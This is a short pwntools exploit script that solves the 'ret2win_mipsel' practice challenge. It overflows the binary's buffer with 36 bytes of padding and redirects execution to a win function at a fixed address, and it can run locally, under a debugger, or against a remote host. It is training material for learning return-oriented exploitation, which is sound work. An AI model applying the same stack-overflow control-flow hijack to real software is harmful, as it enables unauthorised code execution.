from pwn import *

"""
Run locally with:
./exploit.py LOCAL
Run against remote with:
./exploit.py HOST=x.x.x.x PORT=xxxxx
"""

splash()
elf = context.binary = ELF("./ret2win_mipsel")


class ROP_Gadget:
    ret2win = 0x00400a00


def conn():
    if args.LOCAL:
        pty = process.PTY
        return process(elf.path, stdin=pty, stdout=pty, stderr=pty)
    elif args.GDB:
        return gdb.debug(elf.path)
    else:
        return remote(args.HOST, args.PORT)

def solve():
    io = conn()

    padding = cyclic(36)

    payload = [
        padding,
        ROP_Gadget.ret2win,
    ]

    io.sendline(flat(payload))
    io.interactive()


if __name__ == "__main__":
    solve()